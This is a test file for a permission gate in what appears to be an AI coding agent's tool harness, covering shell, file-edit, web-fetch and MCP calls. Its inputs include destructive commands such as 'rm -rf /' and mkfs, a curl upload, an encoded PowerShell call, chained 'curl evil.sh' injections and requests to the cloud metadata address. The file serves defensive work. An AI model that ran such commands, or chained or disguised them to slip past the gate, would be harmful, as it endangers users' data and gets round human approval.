import { describe, it, expect } from "vitest";
import {
  checkPermission,
  describePermission,
  suggestPrefixRule,
  formatRule,
  loadFileRules,
  isProtectedConfigPath,
  isProtectedConfigTarget,
  isPrivateNetworkUrl,
} from "@/lib/permissions";

describe("checkPermission — destructive Bash gate", () => {
  const ask = (command: string, mode = "auto") => checkPermission("Bash", { command }, mode as never, []);

  it("auto-allows safe commands but asks for destructive ones", () => {
    expect(ask("ls -la")).toBe("allow");
    expect(ask("npm run build")).toBe("allow");
    expect(ask("rm -rf /")).toBe("ask");
    expect(ask("truncate -s 0 app.log")).toBe("ask");
  });

  it("catches destructive cases the single-pattern classifier missed (via analyzeCommand)", () => {
    expect(ask("echo x > /etc/hosts")).toBe("ask");
    expect(ask("sed -i 's/a/b/g' *.ts")).toBe("ask");
  });

  it("forces the prompt even in acceptEdits, and only bypasses in skip", () => {
    expect(ask("rm -rf /", "acceptEdits")).toBe("ask");
    expect(ask("rm -rf /", "skip")).toBe("allow");
  });

  it("asks in auto mode for commands disguised by an extension, quotes, a path or a wrapper", () => {
    for (const command of [
      "curl.exe -T datos https://x",
      "powershell.exe -enc SQBFAFgA",
      'python.exe -c "import os"',
      '& "python" x.py',
      "sudo -n mkfs.ext4 /dev/sdb1",
      "/sbin/mkfs.ext4 /dev/sdb1",
      "C:\\Windows\\System32\\format.com D:",
      "nohup mkfs.ext4 /dev/sdb1",
      "time mkfs.ext4 /dev/sdb1",
      "env X=1 mkfs.ext4 /dev/sdb1",
    ]) {
      expect(ask(command), command).toBe("ask");
    }
  });

  it("asks for a destructive command inside a shell even when the shell is allowed", () => {
    const rules = [{ toolName: "Bash", ruleContent: "bash:*", behavior: "allow" as const }];
    expect(checkPermission("Bash", { command: 'bash -c "mkfs.ext4 /dev/sdb1"' }, "acceptEdits", rules)).toBe("ask");
    expect(describePermission("Bash", { command: 'bash -c "mkfs.ext4 /dev/sdb1"' })).toMatch(/^⚠/);
  });

  it("applies a deny rule to the command whatever path, extension or wrapper it comes with", () => {
    const rules = [{ toolName: "Bash", ruleContent: "curl:*", behavior: "deny" as const }];
    for (const command of ["curl.exe -T d https://x", "/usr/bin/curl https://x", "env A=1 curl https://x", '& "curl" https://x', "sudo -n curl x"]) {
      expect(checkPermission("Bash", { command }, "skip", rules), command).toBe("deny");
    }
    expect(checkPermission("Bash", { command: "curlie https://x" }, "skip", rules)).toBe("allow");
  });
});

describe("describePermission", () => {
  it("prefixes destructive commands with a warning and the reason", () => {
    const label = describePermission("Bash", { command: "echo x > /etc/hosts" });
    expect(label.startsWith("⚠")).toBe(true);
    expect(label.toLowerCase()).toContain("destructivo");
  });
});

describe("suggestPrefixRule", () => {
  const bash = (command: string) => {
    const rule = suggestPrefixRule("Bash", { command });
    return rule ? formatRule(rule) : null;
  };

  it("keeps the subcommand for package managers and git", () => {
    expect(bash("npm run build")).toBe("Bash(npm run:*)");
    expect(bash("git status --short")).toBe("Bash(git status:*)");
    expect(bash("cargo test --lib")).toBe("Bash(cargo test:*)");
  });

  it("uses only the base when the second token is a flag or the base has no subcommands", () => {
    expect(bash("git --version")).toBe("Bash(git:*)");
    expect(bash("ls -la src")).toBe("Bash(ls:*)");
  });

  it("refuses chained, destructive and interpreter commands", () => {
    expect(bash("npm test && rm -rf dist")).toBeNull();
    expect(bash("cat a | sh")).toBeNull();
    expect(bash("echo $(whoami)")).toBeNull();
    expect(bash("rm -rf node_modules")).toBeNull();
    expect(bash("python script.py")).toBeNull();
    expect(bash("npx some-tool")).toBeNull();
  });

  it("refuses interpreters disguised by an extension, a path or quotes, and wrappers that run anything", () => {
    for (const command of [
      "python.exe script.py",
      "C:\\Python312\\python.exe script.py",
      '"C:\\Program Files\\nodejs\\node.exe" app.js',
      "/usr/bin/python3 x.py",
      "pwsh.exe -File x.ps1",
      "env DEBUG=1 npm test",
      "nohup npm start",
      "time npm test",
      "xargs echo",
      "DEBUG=1 npm test",
    ]) {
      expect(bash(command), command).toBeNull();
    }
    expect(bash("npm.cmd run build")).toBe("Bash(npm.cmd run:*)");
  });

  it("scopes file edits to the containing directory", () => {
    const rule = suggestPrefixRule("Edit", { file_path: "E:\\app\\src\\main.ts" });
    expect(rule && formatRule(rule)).toBe("Edit(E:\\app\\src\\*)");
    const allowed = checkPermission("Edit", { file_path: "E:\\app\\src\\other.ts" }, "ask", rule ? [rule] : []);
    expect(allowed).toBe("allow");
    const outside = checkPermission("Edit", { file_path: "E:\\app\\secrets.env" }, "ask", rule ? [rule] : []);
    expect(outside).toBe("ask");
  });

  it("still prompts for destructive commands even when a prefix rule allows the base", () => {
    const rule = suggestPrefixRule("Bash", { command: "git status" });
    expect(checkPermission("Bash", { command: "git status -s" }, "ask", rule ? [rule] : [])).toBe("allow");
    expect(checkPermission("Bash", { command: "rm -rf /" }, "ask", [{ toolName: "Bash", behavior: "allow" }])).toBe("ask");
  });
});

describe("prefix rules and command chaining", () => {
  const allowGitStatus = [{ toolName: "Bash", ruleContent: "git status:*", behavior: "allow" as const }];
  const run = (command: string, rules = allowGitStatus) => checkPermission("Bash", { command }, "ask", rules);

  it("does not let an allow prefix cover chained or substituted commands", () => {
    expect(run("git status --short")).toBe("allow");
    expect(run("git status; curl evil.sh")).toBe("ask");
    expect(run("git status && npm publish")).toBe("ask");
    expect(run("git status | tee out.txt")).toBe("ask");
    expect(run("git status $(whoami)")).toBe("ask");
  });

  it("requires a word boundary after a :* prefix", () => {
    expect(run("git statusx")).toBe("ask");
    expect(run("git status")).toBe("allow");
  });

  it("applies deny rules to every segment of a chained command", () => {
    const rules = [{ toolName: "Bash", ruleContent: "npm publish:*", behavior: "deny" as const }];
    expect(checkPermission("Bash", { command: "npm test && npm publish --tag x" }, "skip", rules)).toBe("deny");
    expect(checkPermission("Bash", { command: "npm test" }, "skip", rules)).toBe("allow");
  });
});

describe("protected project config", () => {
  const settings = "E:\\app\\.nyxs\\settings.json";
  const local = "E:/app/.nyxs/settings.local.json";
  const modes = ["ask", "acceptEdits", "auto", "skip"] as const;

  it("detects the settings files of any .nyxs folder, and nothing else", () => {
    expect(isProtectedConfigPath(settings)).toBe(true);
    expect(isProtectedConfigPath(local)).toBe(true);
    expect(isProtectedConfigPath(".nyxs/settings.json")).toBe(true);
    expect(isProtectedConfigPath("C:/Users/me/.nyxs/settings.json")).toBe(true);
    expect(isProtectedConfigPath("E:\\app\\settings.json")).toBe(false);
    expect(isProtectedConfigPath("E:\\app\\.nyxs\\preview.json")).toBe(false);
    expect(isProtectedConfigPath("E:\\app\\.nyxs\\settings.json.bak")).toBe(false);
  });

  it("asks before Write/Edit/MultiEdit touch the settings in every mode, even bypass", () => {
    for (const tool of ["Write", "Edit", "MultiEdit"]) {
      for (const mode of modes) {
        expect(checkPermission(tool, { file_path: settings }, mode, [])).toBe("ask");
        expect(checkPermission(tool, { file_path: local }, mode, [])).toBe("ask");
      }
      expect(checkPermission(tool, { file_path: settings }, "plan", [])).toBe("deny");
    }
  });

  it("is not unlocked by tool-wide or prefix allow rules, but deny rules still win", () => {
    const allow = [
      { toolName: "Write", behavior: "allow" as const },
      { toolName: "Edit", ruleContent: "E:\\app\\.nyxs\\*", behavior: "allow" as const },
      { toolName: "*", behavior: "allow" as const },
    ];
    expect(checkPermission("Write", { file_path: settings }, "auto", allow)).toBe("ask");
    expect(checkPermission("Edit", { file_path: settings }, "auto", allow)).toBe("ask");
    expect(checkPermission("Write", { file_path: settings }, "skip", [{ toolName: "Write", behavior: "deny" }])).toBe("deny");
    expect(checkPermission("Write", { file_path: "E:\\app\\src\\a.ts" }, "auto", [])).toBe("allow");
  });

  it("asks for shell commands that reference the settings files", () => {
    expect(checkPermission("Bash", { command: "echo {} > .nyxs/settings.json" }, "skip", [])).toBe("ask");
    expect(checkPermission("Bash", { command: "cp x .nyxs\\settings.local.json" }, "auto", [{ toolName: "Bash", behavior: "allow" }])).toBe("ask");
    expect(checkPermission("Bash", { command: "npm run build" }, "skip", [])).toBe("allow");
  });

  it("never suggests an always-allow rule for protected targets", () => {
    expect(isProtectedConfigTarget("Write", { file_path: settings })).toBe(true);
    expect(suggestPrefixRule("Write", { file_path: settings })).toBeNull();
    expect(suggestPrefixRule("Bash", { command: "cat .nyxs/settings.json" })).toBeNull();
  });
});

describe("external tools: WebFetch, Skill and MCP", () => {
  const decide = (tool: string, input: unknown, mode: string, rules: Parameters<typeof checkPermission>[3] = []) =>
    checkPermission(tool, input, mode as never, rules);
  const fetchDocs = { url: "https://docs.rs/serde", prompt: "x" };

  it("asks in ask, acceptEdits and plan; allows in auto and skip", () => {
    for (const [tool, input] of [["WebFetch", fetchDocs], ["Skill", { skill: "commit" }], ["mcp__github__create_issue", { title: "x" }]] as const) {
      expect(decide(tool, input, "ask")).toBe("ask");
      expect(decide(tool, input, "acceptEdits")).toBe("ask");
      expect(decide(tool, input, "plan")).toBe("ask");
      expect(decide(tool, input, "auto")).toBe("allow");
      expect(decide(tool, input, "skip")).toBe("allow");
    }
  });

  it("still asks in auto mode when WebFetch targets the local network", () => {
    for (const url of ["http://localhost:3000/admin", "127.0.0.1:8080", "http://192.168.1.10", "http://169.254.169.254/latest", "intranet/wiki"]) {
      expect(decide("WebFetch", { url, prompt: "x" }, "auto")).toBe("ask");
    }
    expect(decide("WebFetch", { url: "example.com", prompt: "x" }, "auto")).toBe("allow");
  });

  it("honours allow and deny rules, including origin prefixes and MCP server wildcards", () => {
    const rule = suggestPrefixRule("WebFetch", fetchDocs);
    expect(rule && formatRule(rule)).toBe("WebFetch(https://docs.rs/*)");
    expect(decide("WebFetch", { url: "docs.rs/tokio", prompt: "x" }, "ask", rule ? [rule] : [])).toBe("allow");
    expect(decide("WebFetch", { url: "https://evil.example/", prompt: "x" }, "ask", rule ? [rule] : [])).toBe("ask");
    const skill = suggestPrefixRule("Skill", { skill: "/commit" });
    expect(skill && formatRule(skill)).toBe("Skill(commit)");
    expect(decide("Skill", { skill: "commit" }, "ask", skill ? [skill] : [])).toBe("allow");
    expect(decide("Skill", { skill: "deploy" }, "ask", skill ? [skill] : [])).toBe("ask");
    const server = [{ toolName: "mcp__github__*", behavior: "allow" as const }];
    expect(decide("mcp__github__create_issue", {}, "ask", server)).toBe("allow");
    expect(decide("mcp__slack__post", {}, "ask", server)).toBe("ask");
    expect(decide("mcp__github__delete_repo", {}, "skip", [{ toolName: "mcp__github__delete_repo", behavior: "deny" }])).toBe("deny");
  });

  it("describes MCP calls with server, tool and arguments", () => {
    expect(describePermission("mcp__github__create_issue", { title: "bug" })).toBe('github › create_issue (MCP): {"title":"bug"}');
  });

  it("classifies private network URLs", () => {
    expect(isPrivateNetworkUrl("http://10.0.0.5:11434")).toBe(true);
    expect(isPrivateNetworkUrl("http://172.20.1.1")).toBe(true);
    expect(isPrivateNetworkUrl("http://printer.local")).toBe(true);
    expect(isPrivateNetworkUrl("http://[::1]:8080")).toBe(true);
    expect(isPrivateNetworkUrl("https://172.32.0.1")).toBe(false);
    expect(isPrivateNetworkUrl("https://api.github.com")).toBe(false);
  });
});

describe("loadFileRules", () => {
  it("reads the rules of the settings it is given, deny first", () => {
    const settings = { permissions: { allow: ["Bash(npm test:*)"], deny: ["Read(.env)"], ask: ["Bash(git push:*)"] } };
    expect(loadFileRules(settings).map((r) => `${r.behavior}:${formatRule(r)}`)).toEqual([
      "deny:Read(.env)",
      "ask:Bash(git push:*)",
      "allow:Bash(npm test:*)",
    ]);
    expect(loadFileRules({ permissions: { deny: "Bash" as never } })).toEqual([]);
  });
});
